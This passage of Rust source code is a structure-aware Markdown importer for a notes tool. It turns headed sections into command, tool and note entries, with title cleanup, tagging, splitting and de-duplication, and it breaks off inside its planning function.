//! Structure-aware Markdown importer.
//!
//! Turns a notes file into recall entries. Nothing here is positional guesswork:
//! every decision is a named rule, applied in this order, and `--dry-run`
//! reports how often each one fired.
//!
//!   1. `mdscan` cleans the text (page furniture, fence repair) and finds the
//!      headings — `#` to `######`, banners, and plain-text ones like
//!      `3️⃣ Title` / `Step 4 — Title`. A `#` inside code is a comment.
//!   2. Headings form a tree. An entry is a heading plus the text up to the
//!      next heading of any level; pure containers (no body) are dropped and
//!      their children become the entries.
//!   3. Titles are cleaned (markup, numbering), and made meaningful and unique
//!      with the *parent heading* ("Docker — Best Practices"), never with a
//!      bare counter unless two entries are otherwise indistinguishable.
//!   4. Category comes from what the body contains: a real command (fenced
//!      shell, or unfenced lines that read as commands) → `command`; a section
//!      about a tool with none → `tool`; everything else → `note`.
//!   5. `tool` is the program the entry is about: named by the heading, else
//!      the program most of its commands run, else empty — never "whatever
//!      came first". Tags and search keywords come from the heading path.
//!   6. A section too long to read as one entry is split at paragraph breaks
//!      (never inside a code block), not silently truncated.

use std::collections::{HashMap, HashSet};
use std::path::Path;

use anyhow::{Context, Result};

use crate::{
    danger::danger_reason,
    db::Database,
    derive::{self, Vocab},
    mdscan::{self, HeadKind},
    models::{fenced_blocks_lang, Category, NewEntry, Source},
    pairs::{self, BlockKind, PairKind},
};

// The top-level banners -> short slug used as the primary tag / context.
const BANNERS: &[(&str, &str)] = &[
    ("LINUX & SYSTEM ADMINISTRATION", "linux"),
    ("GIT & GITHUB", "git"),
    ("TMUX", "tmux"),
    ("VIM / NEOVIM", "vim"),
    ("CLI CHEATSHEETS & REFERENCE", "cli"),
    ("ENCRYPTION & SECURITY", "crypto"),
    ("WINDOWS", "windows"),
    ("MISCELLANEOUS", "misc"),
];

// Pure navigation. (A "Quick Reference Card" is real content — a whole cheat sheet — so it is kept.)
const NAV_DROP: &[&str] = &["table of contents", "quick navigation", "print this", "tags"];
const GENERIC: &[&str] = &[
    "overview", "examples", "use when", "best practices", "troubleshooting", "configuration",
    "installation", "prerequisites", "conclusion", "quick reference",
    "quick reference commands", "core concepts", "mental model", "syntax",
    "description", "advanced features", "security hardening", "key learning points",
    "additional resources", "additional tools", "advanced configuration",
    "pro tips", "tips & tricks",
];
/// A heading naming one of these (and no command in the body) is a tool profile.
const TOOL_WORDS: &[&str] = &["tool", "tools", "toolkit", "framework", "suite", "utility", "utilities"];
const MAX_PART: usize = 6000; // a section longer than this is split at paragraph breaks
const HARD_CAP: usize = 20000; // last resort: one block (e.g. a script) longer than this is truncated

pub struct ImportOptions {
    pub dry_run:      bool,
    pub flagged_only: bool,
    pub extra_tags:   Vec<String>,
    /// Also store every annotated command (`# what it does` + command, a
    /// `` - `cmd` - description `` bullet, a table row, a key table) as an entry of its own.
    pub per_command:  bool,
}

pub struct ImportStats {
    pub candidates: usize,  // entries that passed all content filters
    pub skipped:    usize,  // headings dropped (nav/empty/flag filter)
    pub duplicates: usize,  // entries skipped because identical data already exists
    pub report:     Report, // what the parser did, rule by rule
}

/// How often each parsing rule fired — printed by `recall import`.
#[derive(Debug, Default)]
pub struct Report {
    pub cleanup:       mdscan::Cleanup,
    pub headings:      usize,
    pub soft_headings: usize,
    pub list_items:    usize,
    pub commands:      usize,
    pub notes:         usize,
    pub tools:         usize,
    pub with_tool:     usize,
    pub qualified:     usize,
    pub repeats:       usize,
    pub pairs_shell:   usize,
    pub pairs_inline:  usize,
    pub pairs_keys:    usize,
    pub pair_repeats:  usize,
    pub split:         usize,
    pub truncated:     usize,
    pub median_chars:  usize,
    pub largest:       Option<(usize, String)>,
}

fn fmt_n(n: usize) -> String {
    let s = n.to_string();
    let mut out = String::new();
    for (i, c) in s.chars().enumerate() {
        if i > 0 && (s.len() - i) % 3 == 0 {
            out.push(',');
        }
        out.push(c);
    }
    out
}

impl Report {
    pub fn render(&self) -> String {
        let c = &self.cleanup;
        let mut rows: Vec<String> = Vec::new();
        rows.push(format!(
            "  headings   {} found ({} plain-text like \"3️⃣ Title\" / \"Step 4 — Title\"); {} list items that a converter had turned into headings put back",
            fmt_n(self.headings), fmt_n(self.soft_headings), fmt_n(self.list_items)
        ));
        let mut cleaned: Vec<String> = Vec::new();
        if c.furniture > 0 {
            cleaned.push(format!("{} page header/footer lines removed", fmt_n(c.furniture)));
        }
        if c.unwrapped > 0 {
            cleaned.push(format!("{} ```markdown wrappers unwrapped", c.unwrapped));
        }
        if c.closed_fences > 0 {
            cleaned.push(format!("{} unclosed code blocks closed", c.closed_fences));
        }
        if c.stray_fences > 0 {
            cleaned.push(format!("{} stray code fences dropped", c.stray_fences));
        }
        if !cleaned.is_empty() {
            rows.push(format!("  cleaned    {}", cleaned.join(", ")));
        }
        rows.push(format!(
            "  entries    {} command · {} note · {} tool — tool identified on {}",
            fmt_n(self.commands), fmt_n(self.notes), fmt_n(self.tools), fmt_n(self.with_tool)
        ));
        let pairs = self.pairs_shell + self.pairs_inline + self.pairs_keys;
        if pairs > 0 {
            rows.push(format!(
                "  per-command {} single-command entries (included above): {} from annotated shell blocks, {} from bullets/table rows, {} key bindings; {} repeats dropped",
                fmt_n(pairs), fmt_n(self.pairs_shell), fmt_n(self.pairs_inline), fmt_n(self.pairs_keys), fmt_n(self.pair_repeats)
            ));
        }
        let mut shaped: Vec<String> = Vec::new();
        if self.qualified > 0 {
            shaped.push(format!("{} titles made unique with their parent heading", fmt_n(self.qualified)));
        }
        if self.repeats > 0 {
            shaped.push(format!("{} repeated sections dropped (same heading path, identical text)", fmt_n(self.repeats)));
        }
        if self.split > 0 {
            shaped.push(format!("{} long sections split at paragraph breaks", self.split));
        }
        if self.truncated > 0 {
            shaped.push(format!("{} entries truncated at {} chars", self.truncated, fmt_n(HARD_CAP)));
        }
        if !shaped.is_empty() {
            rows.push(format!("  shaped     {}", shaped.join(", ")));
        }
        if let Some((n, t)) = &self.largest {
            rows.push(format!("  size       median {} chars, largest {} chars (\"{}\")", fmt_n(self.median_chars), fmt_n(*n), t));
        }
        rows.join("\n")
    }
}

// ─── text helpers ────────────────────────────────────────────────────────────

/// Remove real HTML tags (`<a id="x"></a>`, `<br>`, `</b>`), and only those:
/// a bare `<` / `>` (as in the heading "`<<` (Here Document)") is text, and so
/// is anything inside backticks.
fn strip_html(s: &str) -> String {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut in_code = false;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '`' {
            in_code = !in_code;
        }
        if c == '<' && !in_code && chars.get(i + 1).is_some_and(|n| n.is_ascii_alphabetic() || *n == '/' || *n == '!') {
            if let Some(rel) = chars[i..].iter().take(300).position(|&x| x == '>') {
                i += rel + 1;
                continue;
            }
        }
        out.push(c);
        i += 1;
    }
    out
}

/// `[text](url)` -> `text`
fn strip_md_links(s: &str) -> String {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::new();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '[' {
            if let Some(rel) = chars[i + 1..].iter().position(|&c| c == ']') {
                let close = i + 1 + rel;
                if chars.get(close + 1) == Some(&'(') {
                    if let Some(rel2) = chars[close + 2..].iter().position(|&c| c == ')') {
                        out.extend(&chars[i + 1..close]);
                        i = close + 2 + rel2 + 1;
                        continue;
                    }
                }
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    out
}

/// Strip leading decoration — emoji, variation selectors, `*`/`#`/`=`/`-` runs —
/// but not ASCII that carries meaning: the `<` of "`<` (Less Than)", `~/.bashrc`, `(2FA)`.
fn strip_leading_symbols(s: &str) -> String {
    s.trim_start_matches(|c: char| {
        !c.is_alphanumeric() && (!c.is_ascii() || c.is_whitespace() || matches!(c, '*' | '#' | '=' | '_' | '-' | '+'))
    })
    .to_string()
}

/// "3.1 The First Line", "13.2.4. Title" -> the title. Decimal section numbers
/// are unambiguous, so they always go.
fn strip_decimal_numbering(s: &str) -> Option<&str> {
    let b = s.as_bytes();
    let mut i = 0;
    let mut groups = 0;
    loop {
        let start = i;
        while i < b.len() && b[i].is_ascii_digit() {
            i += 1;
        }
        if i == start {
            return None;
        }
        groups += 1;
        if i + 1 < b.len() && b[i] == b'.' && b[i + 1].is_ascii_digit() {
            i += 1;
            continue;
        }
        break;
    }
    if groups < 2 {
        return None;
    }
    if i < b.len() && (b[i] == b'.' || b[i] == b')') {
        i += 1;
    }
    let rest = &s[i..];
    rest.starts_with(char::is_whitespace).then(|| rest.trim_start())
}

/// Strip list numbering like `1) `, `2. `, `3: `, or the keycap form `1️⃣ `.
/// A bare number followed only by a space (e.g. "5 things") is left intact —
/// `strip_sibling_numbers` decides that one, with the siblings in view.
fn strip_leading_numbering(s: &str) -> String {
    if let Some(rest) = strip_decimal_numbering(s) {
        return rest.to_string();
    }
    let chars: Vec<char> = s.chars().collect();
    if chars.first().map_or(true, |c| !c.is_ascii_digit()) {
        return s.to_string();
    }
    let mut i = 0;
    while i < chars.len() && chars[i].is_ascii_digit() {
        i += 1;
    }
    let mut j = i;
    let mut saw_sep = false;
    while j < chars.len()
        && matches!(chars[j], '\u{FE0F}' | '\u{20E3}' | ')' | '.' | ':')
    {
        j += 1;
        saw_sep = true;
    }
    if !saw_sep {
        return s.to_string(); // "2FA", "7z", "5 things" -> unchanged
    }
    while j < chars.len() && chars[j].is_whitespace() {
        j += 1;
    }
    chars[j..].iter().collect()
}

fn collapse_ws(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Drop a dangling "(" left by a title that a PDF line-wrap cut in two:
/// "Lock down your accounts (highest" -> "Lock down your accounts".
fn fix_parens(s: &str) -> String {
    let open = s.matches('(').count();
    let close = s.matches(')').count();
    if open > close {
        if let Some(pos) = s.rfind('(') {
            if !s[pos..].contains(')') {
                return s[..pos].trim_end().to_string();
            }
        }
    }
    s.to_string()
}

fn clean_title(raw: &str) -> String {
    let mut t = strip_html(raw).replace("**", "").replace('`', "");
    t = strip_md_links(&t);
    t = t.trim().to_string();
    t = strip_leading_symbols(&t);
    t = strip_leading_numbering(&t);
    t = strip_leading_symbols(&t); // numbering may expose more leading symbols
    let t = t.trim().trim_end_matches(':').trim().to_string();
    fix_parens(&collapse_ws(&t))
}

fn slug(s: &str, max: usize) -> String {
    let cleaned = strip_html(s).replace("**", "");
    let mut out = String::new();
    for c in cleaned.chars() {
        if c.is_alphanumeric() {
            out.extend(c.to_lowercase());
        } else if c == ' ' || c == '-' || c == '_' {
            out.push('-');
        }
    }
    // collapse consecutive dashes
    let mut collapsed = String::new();
    let mut prev_dash = false;
    for c in out.chars() {
        if c == '-' {
            if !prev_dash {
                collapsed.push('-');
            }
            prev_dash = true;
        } else {
            collapsed.push(c);
            prev_dash = false;
        }
    }
    let chars: Vec<char> = collapsed.trim_matches('-').chars().collect();
    if chars.len() <= max {
        return chars.iter().collect();
    }
    let mut cut = chars[..max].to_vec();
    if let Some(pos) = cut.iter().rposition(|&c| c == '-') {
        if pos >= 8 {
            cut.truncate(pos); // trim to a word boundary, not mid-word
        }
    }
    cut.iter().collect::<String>().trim_matches('-').to_string()
}

/// Blank lines, horizontal rules (`---`) and banner rules (`# =====`) at either
/// edge of a body are decoration, not content.
fn strip_decor(body: &str) -> String {
    let decor = |l: &str| {
        let t = l.trim();
        t.is_empty() || (t.len() >= 3 && t.chars().all(|c| matches!(c, '-' | '*' | '_' | '=' | '#' | '~' | ' ')))
    };
    let lines: Vec<&str> = body.lines().collect();
    let start = lines.iter().position(|l| !decor(l)).unwrap_or(lines.len());
    let end = lines.iter().rposition(|l| !decor(l)).map_or(start, |p| p + 1);
    lines[start..end].join("\n")
}

fn cap_chars(s: &str, max: usize) -> (String, bool) {
    if s.chars().count() <= max {
        return (s.to_string(), false);
    }
    let cut: String = s.chars().take(max).collect();
    (format!("{}\n\n… [truncated — full text in the source file]", cut.trim_end()), true)
}

/// `1. [Title](#anchor)` / `- [Title](#anchor)`: a line that is nothing but a link to a section.
/// A table row that merely *contains* such a link is content.
fn is_toc_line(l: &str) -> bool {
    let t = l.trim();
    let t = t.strip_prefix(['-', '*', '+']).map(str::trim_start).unwrap_or_else(|| {
        let digits = t.bytes().take_while(|b| b.is_ascii_digit()).count();
        match t[digits..].strip_prefix(['.', ')']) {
            Some(rest) if digits > 0 => rest.trim_start(),
            _ => t,
        }
    });
    t.starts_with('[') && t.ends_with(')') && t.contains("](#") && !t.contains('|')
}

/// A section that is only a list of links to other sections is a table of contents.
fn toc_like(body: &str) -> bool {
    let lines: Vec<&str> = body.lines().filter(|l| !l.trim().is_empty()).collect();
    lines.len() >= 3 && lines.iter().filter(|l| is_toc_line(l)).count() * 10 >= lines.len() * 7
}

fn banner_slug(title: &str) -> Option<&'static str> {
    BANNERS.iter().find(|(name, _)| name.eq_ignore_ascii_case(title)).map(|(_, s)| *s)
}

// ─── the heading tree ────────────────────────────────────────────────────────

struct Node {
    at:     usize,
    level:  u8,
    kind:   HeadKind,
    raw:    String,
    title:  String,
    parent: Option<usize>,
    body:   String,
}

/// `2 Getting Help` -> (2, byte offset of "Getting Help").
fn lead_number(title: &str) -> Option<(u32, usize)> {
    let digits = title.bytes().take_while(|b| b.is_ascii_digit()).count();
    if digits == 0 || digits > 3 || !title[digits..].starts_with(' ') {
        return None;
    }
    let rest = title[digits..].trim_start_matches([' ', '-', '–', '—', ':']);
    (!rest.is_empty()).then(|| (title[..digits].parse().unwrap_or(0), title.len() - rest.len()))
}

/// "1 Introduction", "2 Getting Help", "3 Tools": strip the numbers, but only
/// when siblings really count up — "5 things" or "2 Factor Auth" alone stay.
fn strip_sibling_numbers(nodes: &mut [Node]) {
    let mut groups: HashMap<Option<usize>, Vec<usize>> = HashMap::new();
    for (i, n) in nodes.iter().enumerate() {
        groups.entry(n.parent).or_default().push(i);
    }
    for idxs in groups.values() {
        let nums: Vec<(usize, u32, usize)> = idxs
            .iter()
            .filter_map(|&i| lead_number(&nodes[i].title).map(|(n, off)| (i, n, off)))
            .collect();
        if nums.windows(2).any(|w| w[1].1 == w[0].1 + 1) {
            for (i, _, off) in nums {
                nodes[i].title = nodes[i].title[off..].trim().to_string();
            }
        }
    }
}

/// Cleaned titles of the ancestors, nearest first.
fn ancestors(nodes: &[Node], i: usize) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = nodes[i].parent;
    while let Some(p) = cur {
        if !nodes[p].title.is_empty() {
            out.push(nodes[p].title.clone());
        }
        cur = nodes[p].parent;
    }
    out
}

fn is_generic(t: &str) -> bool {
    GENERIC.contains(&t.to_lowercase().as_str())
}

/// The nearest ancestor worth naming: not itself generic, not the same as the title.
fn context_of(title: &str, ancestors: &[String]) -> Option<String> {
    let ts = slug(title, 24);
    ancestors.iter().find(|a| !is_generic(a) && slug(a, 24) != ts).cloned()
}

/// "Examples" alone says nothing: "Docker — Examples". Very short titles get the same.
fn display_title(title: &str, ancestors: &[String]) -> String {
    if is_generic(title) || title.chars().count() < 8 {
        if let Some(ctx) = context_of(title, ancestors) {
            return format!("{} — {}", ctx, title);
        }
    }
    title.to_string()
}

/// The nearest heading at level 1–2 (the entry itself included): the entry's section tag.
fn section_title(nodes: &[Node], i: usize) -> Option<String> {
    let mut cur = Some(i);
    while let Some(c) = cur {
        let n = &nodes[c];
        if n.level <= 2 && n.kind != HeadKind::Banner && banner_slug(&n.title).is_none() && !n.title.is_empty() {
            return Some(n.title.clone());
        }
        cur = n.parent;
    }
    None
}

// ─── body analysis ───────────────────────────────────────────────────────────

#[derive(Default)]
struct Analysis {
    /// Copy-ready command: the first command block, or first run of command lines.
    command:     String,
    /// Any command the entry contains looks destructive.
    danger:      bool,
    /// The program of every command line, in order.
    programs:    Vec<String>,
    fenced_cmd:  bool,
    unfenced:    usize,
    /// `` - `cmd` - description `` bullets and table rows.
    inline:      usize,
    text_lines:  usize,
    /// `vim` / `tmux` / `awk` fences (and key tables in a vim/tmux section) name their own tool.
    lang_tool:   Option<String>,
}

/// Close a run of unfenced command lines (one that is only comments is not a command).
fn flush_group(group: &mut Vec<&str>, groups: &mut Vec<String>) {
    if group.iter().any(|l| !l.starts_with('#')) {
        groups.push(group.iter().map(|l| l.strip_prefix("$ ").unwrap_or(l)).collect::<Vec<_>>().join("\n"));
    }
    group.clear();
}

fn analyze(body: &str, vocab: &Vocab, keys_tool: Option<&str>) -> Analysis {
    let mut a = Analysis::default();
    let mut blocks: Vec<String> = Vec::new();

    for (lang, block) in fenced_blocks_lang(body) {
        let text = block.trim_matches('\n');
        if text.trim().is_empty() {
            continue;
        }
        let kind = pairs::classify(&lang, text, vocab, keys_tool);
        if kind == BlockKind::Other {
            continue; // python, yaml, config, a text box…: not a program invocation
        }
        if matches!(lang.as_str(), "vim" | "tmux" | "awk") {
            a.lang_tool.get_or_insert(lang.clone());
        } else if kind == BlockKind::Keys {
            if let Some(k) = keys_tool {
                a.lang_tool.get_or_insert(k.to_string());
            }
        }
        if kind == BlockKind::Shell {
            let explicit = !lang.is_empty() && !matches!(lang.as_str(), "text" | "txt");
            let unix = !pairs::is_powershell(&lang);
            let progs: Vec<String> = if explicit {
                // the author said "shell": lines that would be typed (not `Host myserver` directives)
                text.lines().filter(|l| pairs::is_command_line(l, unix)).flat_map(derive::programs_of_line).collect()
            } else {
                // bare fence: believe only command-shaped lines
                text.lines().filter(|l| vocab.command_line(l).is_some()).flat_map(derive::programs_of_line).collect()
            };
            a.programs.extend(progs);
        }
        a.fenced_cmd = true;
        blocks.push(text.to_string());
    }

    // Unfenced command lines, grouped: a run of them (comments allowed between) is one command.
    let mut in_code = false;
    let mut group: Vec<&str> = Vec::new();
    let mut groups: Vec<String> = Vec::new();
    for l in body.lines() {
        if l.trim_start().starts_with("```") {
            in_code = !in_code;
            flush_group(&mut group, &mut groups);
            continue;
        }
        if in_code {
            continue;
        }
        let t = l.trim();
        if t.is_empty() {
            flush_group(&mut group, &mut groups);
            continue;
        }
        a.text_lines += 1;
        if vocab.command_line(t).is_some() {
            a.unfenced += 1;
            a.programs.extend(derive::programs_of_line(t));
            group.push(t);
        } else if t.starts_with('#') && !group.is_empty() {
            group.push(t);
        } else {
            flush_group(&mut group, &mut groups);
        }
    }
    flush_group(&mut group, &mut groups);

    // `- `cmd` - what it does` bullets and table rows are commands too.
    let inline = pairs::inline_pairs(body, keys_tool.is_some());
    a.inline = inline.len();
    for p in &inline {
        a.programs.extend(derive::programs_of_line(&p.command));
    }

    a.danger = blocks.iter().chain(groups.iter()).any(|c| danger_reason(c).is_some())
        || inline.iter().any(|p| danger_reason(&p.command).is_some());
    a.command = if a.fenced_cmd {
        blocks.into_iter().next().unwrap_or_default()
    } else if let Some(g) = groups.into_iter().next() {
        g
    } else {
        inline.iter().take(12).map(|p| p.command.as_str()).collect::<Vec<_>>().join("\n")
    };
    a
}

/// A command is either fenced shell/keys, or command lines — unfenced, or
/// `` - `cmd` - description `` bullets/table rows — that make up a real share of
/// the body (a quarter, or at least three).
fn categorize(title_low: &str, a: &Analysis) -> Category {
    let share = |n: usize| n > 0 && (n * 4 >= a.text_lines || n >= 3);
    if a.fenced_cmd || share(a.unfenced) || share(a.inline) {
        return Category::Command;
    }
    let words: Vec<&str> = title_low.split(|c: char| !c.is_alphanumeric()).collect();
    if words.iter().any(|w| TOOL_WORDS.contains(w)) {
        return Category::Tool;
    }
    Category::Note
}

/// `nmap (Port Scanning)`, `# find`, `awk — text processing`: the heading names the program.
/// A bare single word must be lower case as written; English words that happen to
/// be programs (`Install`, `Time`) don't count.
fn title_tool(raw_title: &str, vocab: &Vocab) -> Option<String> {
    let t = raw_title.trim().trim_matches(|c: char| c == '*' || c == '`').trim();
    let end = t.find(|c: char| c.is_whitespace() || matches!(c, '(' | ':' | '—' | '–')).unwrap_or(t.len());
    let (first, rest) = t.split_at(end);
    let rest = rest.trim();
    let stem = first.to_lowercase();
    if !vocab.knows(&stem) {
        return None;
    }
    let delimited = rest.is_empty()
        || rest.starts_with(['(', '—', '–', ':'])
        || rest.starts_with("- ");
    if !delimited {
        return None;
    }
    if rest.is_empty() && first.chars().any(|c| c.is_uppercase()) {
        return None;
    }
    Some(stem)
}

fn pick_tool(raw_title: &str, tags: &[String], a: &Analysis, vocab: &Vocab) -> String {
    // Keybinding-heavy topics: the topic *is* the tool, whatever the first line says.
    if let Some(t) = tags.iter().map(|t| t.to_lowercase()).find(|t| t == "vim" || t == "tmux") {
        return t;
    }
    title_tool(&clean_title(raw_title), vocab)
        .or_else(|| a.lang_tool.clone())
        .or_else(|| derive::dominant_tool(&a.programs, vocab))
        .unwrap_or_default()
}

/// Search keywords from the heading path: words a person would type that the
/// title itself doesn't hold ("linux", "file operations").
fn context_words(ancestors: &[String], title: &str, doc: Option<&str>) -> String {
    const SKIP: &[&str] = &["the", "and", "for", "with", "from", "your", "guide", "notes", "how"];
    let own: HashSet<String> = title.split(|c: char| !c.is_alphanumeric()).map(|w| w.to_lowercase()).collect();
    let mut seen: HashSet<String> = HashSet::new();
    let mut out: Vec<String> = Vec::new();
    for src in doc.into_iter().chain(ancestors.iter().rev().map(|s| s.as_str())) {
        for w in src.split(|c: char| !c.is_alphanumeric()) {
            let w = w.to_lowercase();
            if w.chars().count() >= 3 && !SKIP.contains(&w.as_str()) && !own.contains(&w) && seen.insert(w.clone()) {
                out.push(w);
            }
        }
    }
    out.truncate(12);
    out.join(" ")
}

// ─── splitting and de-duplicating ────────────────────────────────────────────

/// Pack paragraphs into parts of at most `max` chars. Blank lines inside a code
/// block are not breaks, and a single paragraph or block longer than `max` stays whole.
fn split_body(body: &str, max: usize) -> Vec<String> {
    if body.chars().count() <= max {
        return vec![body.to_string()];
    }
    let mut paras: Vec<String> = Vec::new();
    let mut cur: Vec<&str> = Vec::new();
    let mut in_code = false;
    for l in body.lines() {
        if l.trim_start().starts_with("```") {
            in_code = !in_code;
        }
        if l.trim().is_empty() && !in_code {
            if !cur.is_empty() {
                paras.push(cur.join("\n"));
                cur.clear();
            }
        } else {
            cur.push(l);
        }
    }
    if !cur.is_empty() {
        paras.push(cur.join("\n"));
    }
    let mut parts: Vec<String> = Vec::new();
    let mut acc = String::new();
    for p in paras {
        if !acc.is_empty() && acc.chars().count() + 2 + p.chars().count() > max {
            parts.push(std::mem::take(&mut acc));
        }
        if !acc.is_empty() {
            acc.push_str("\n\n");
        }
        acc.push_str(&p);
    }
    if !acc.is_empty() {
        parts.push(acc);
    }
    parts
}

struct Draft {
    title:     String,
    ancestors: Vec<String>, // nearest first
    entry:     NewEntry,
    /// Set for per-command entries: (kind, description, normalised command).
    pair:      Option<(PairKind, String, String)>,
}

/// "Examples" under Docker and under Git are different entries: prefix the
/// nearest ancestors that tell them apart ("Docker — Examples"). Only entries
/// that are still identical after that get a counter.
fn qualified(title: &str, ancestors: &[String], depth: usize) -> String {
    let ts = slug(title, 24);
    let low = title.to_lowercase();
    let mut picked: Vec<&str> = Vec::new();
    for a in ancestors {
        if picked.len() == depth {
            break;
        }
        // skip generic parents, and any the title already carries ("Docker — Examples")
        if !is_generic(a) && slug(a, 24) != ts && !low.contains(&a.to_lowercase()) {
            picked.push(a);
        }
    }
    picked.reverse();
    picked.iter().map(|s| s.to_string()).chain(std::iter::once(title.to_string())).collect::<Vec<_>>().join(" — ")
}

/// The same section pasted twice (merged notes overlap) is one entry: same
/// heading, same heading path, same text. Same heading and text under a
/// *different* parent is kept — its context differs.
fn drop_repeats(drafts: &mut Vec<Draft>, report: &mut Report) {
    let mut seen: HashSet<(String, String, Vec<String>)> = HashSet::new();
    let before = drafts.len();
    // per-command entries have their own, looser check (`drop_pair_repeats`)
    drafts.retain(|d| d.pair.is_some() || seen.insert((d.title.to_lowercase(), d.entry.content.clone(), d.ancestors.clone())));
    report.repeats = before - drafts.len();
}

/// The same description + command in two places (overlapping cheat sheets) is one entry.
fn drop_pair_repeats(drafts: &mut Vec<Draft>, report: &mut Report) {
    let mut seen: HashSet<(String, String)> = HashSet::new();
    let before = drafts.len();
    drafts.retain(|d| match &d.pair {
        Some((_, desc, cmd)) => seen.insert((desc.clone(), cmd.clone())),
        None => true,
    });
    report.pair_repeats = before - drafts.len();
}

/// A command with its comment lines and spacing stripped, for comparing two spellings of it.
fn norm_cmd(c: &str) -> String {
    c.lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#') && !l.starts_with("\" "))
        .collect::<Vec<_>>()
        .join(" ")
}

/// The program a keys section is about: a vim/tmux/emacs tag, else the first of those
/// words in the heading path. It is what lets a bare two-column fence be read as a key table.
fn keys_context(tags: &[String], title: &str, anc: &[String]) -> Option<&'static str> {
    let name = |w: &str| match w {
        "tmux" => Some("tmux"),
        "vim" | "neovim" | "nvim" => Some("vim"),
        "emacs" => Some("emacs"),
        _ => None,
    };
    tags.iter()
        .find_map(|t| name(&t.to_lowercase()))
        .or_else(|| {
            std::iter::once(title)
                .chain(anc.iter().map(String::as_str))
                .find_map(|text| text.split(|c: char| !c.is_alphanumeric()).find_map(|w| name(&w.to_lowercase())))
        })
}

fn pair_tool(p: &pairs::Pair, keys_tool: Option<&str>, fallback: &str, vocab: &Vocab) -> String {
    if let Some(t) = &p.tool {
        return t.clone();
    }
    // In a vim/tmux section a lone word like `dd` or `p` is a keystroke, not a program.
    if let Some(k) = keys_tool {
        if p.command.split_whitespace().count() < 2 {
            return k.to_string();
        }
    }
    let progs: Vec<String> = p.command.lines().flat_map(derive::programs_of_line).collect();
    derive::dominant_tool(&progs, vocab)
        .or_else(|| keys_tool.map(str::to_string))
        .unwrap_or_else(|| fallback.to_string())
}

fn make_unique(drafts: &mut [Draft], report: &mut Report) {
    let mut groups: HashMap<String, Vec<usize>> = HashMap::new();
    for (i, d) in drafts.iter().enumerate() {
        groups.entry(d.title.to_lowercase()).or_default().push(i);
    }
    let mut dups: Vec<Vec<usize>> = groups.into_values().filter(|g| g.len() > 1).collect();
    dups.sort();
    for mut ids in dups {
        let base = drafts[ids[0]].title.clone();
        for depth in 1..=2 {
            if ids.len() <= 1 {
                break;
            }
            let cands: Vec<String> = ids.iter().map(|&i| qualified(&base, &drafts[i].ancestors, depth)).collect();
            let mut freq: HashMap<String, usize> = HashMap::new();
            for c in &cands {
                *freq.entry(c.to_lowercase()).or_insert(0) += 1;
            }
            let mut still = Vec::new();
            for (&i, c) in ids.iter().zip(&cands) {
                if freq[&c.to_lowercase()] == 1 && *c != base {
                    drafts[i].title = c.clone();
                    report.qualified += 1;
                } else {
                    still.push(i);
                }
            }
            ids = still;
        }
        for (n, &i) in ids.iter().enumerate().skip(1) {
            drafts[i].title = format!("{} ({})", base, n + 1);
            report.qualified += 1;
        }
    }
}

// ─── planning: text -> entries ───────────────────────────────────────────────

struct Plan {
    items:   Vec<NewEntry>,
    skipped: usize,
    report:  Report,
}

fn is_flagged(raw_title: &str, ancestors: &[String]) -> bool {
    let hit = |s: &str| {
        let u = s.to_uppercase();
        u.contains("CRITICAL") || u.contains("IMPORTANT")
    };
    hit(raw_title) || ancestors.iter().any(|a| hit(a))
}

fn plan(text: &str, opts: &ImportOptions) -> Plan {
    let mut report = Report::default();
    let mut norm = mdscan::normalize(text);

    // What this file itself runs in its shell blocks: lets an unfenced
    // `hashcat -m 0 …` be recognised as a command and a sentence be left alone.
    let vocab = {
        let joined = norm.lines.iter().map(|l| l.text.as_str()).collect::<Vec<_>>().join("\n");
        let blocks = fenced_blocks_lang(&joined);
        Vocab::learn(
            blocks
                .iter()
                .filter(|(lang, _)| !lang.is_empty() && derive::is_shell_lang(lang))
                .map(|(_, b)| b.as_str()),
        )
    };

    let scan = mdscan::find_headings(&mut norm.lines, &vocab);
    report.cleanup = norm.cleanup.clone();
    report.list_items = scan.demoted.len();
    report.headings = scan.heads.len();
    report.soft_headings = scan.heads.iter().filter(|h| h.kind.is_soft()).count();
    let lines = &norm.lines;

    let mut nodes: Vec<Node> = scan
        .heads
        .iter()
        .enumerate()
        .map(|(k, h)| {
            let end = scan.heads.get(k + 1).map_or(lines.len(), |n| n.at);
            let body = lines[h.at + 1..end].iter().map(|l| l.text.as_str()).collect::<Vec<_>>().join("\n");
            let body = strip_decor(&body);
            Node { at: h.at, level: h.level, kind: h.kind, raw: h.raw.clone(), title: clean_title(&h.raw), parent: None, body }
        })
        .collect();

    let mut stack: Vec<usize> = Vec::new();
    for i in 0..nodes.len() {
        while stack.last().is_some_and(|&t| nodes[t].level >= nodes[i].level) {
            stack.pop();
        }
        nodes[i].parent = stack.last().copied();
        stack.push(i);
    }
    strip_sibling_numbers(&mut nodes);

    let mut drafts: Vec<Draft> = Vec::new();
    let mut skipped = 0usize;
    let mut major = "";

    for i in 0..nodes.len() {
        let n = &nodes[i];
        if let Some(s) = banner_slug(&n.title) {
            major = s; // a banner sets the topic for everything after it
        }
        if n.title.is_empty() {
            skipped += 1;
            continue;
        }
        let low = n.title.to_lowercase();
        let anc = ancestors(&nodes, i);
        if opts.flagged_only && !is_flagged(&n.raw, &anc) {
            skipped += 1;
            continue;
        }
        if (NAV_DROP.contains(&low.as_str()) && !n.body.contains("```")) // "Print This" with a cheat sheet in it is not navigation
            || (n.body.len() < 20 && !n.body.contains("```")) // a fenced one-liner is worth keeping
            || toc_like(&n.body)
        {
            skipped += 1;
            continue;
        }

        let raw_up = n.raw.to_uppercase();
        let printed = norm.printed.iter().find(|p| n.at >= p.from && n.at <= p.to).map(|p| p.title.as_str());
        let mut tags: Vec<String> = Vec::new();
        if !major.is_empty() {
            tags.push(major.to_string());
        }
        if let Some(sec) = section_title(&nodes, i) {
            tags.push(slug(&sec, 24));
        }
        if let Some(doc) = printed {
            tags.push(slug(doc, 24));
        }
        if raw_up.contains("CRITICAL") {
            tags.push("critical".into());
        } else if raw_up.contains("IMPORTANT") {
            tags.push("important".into());
        }
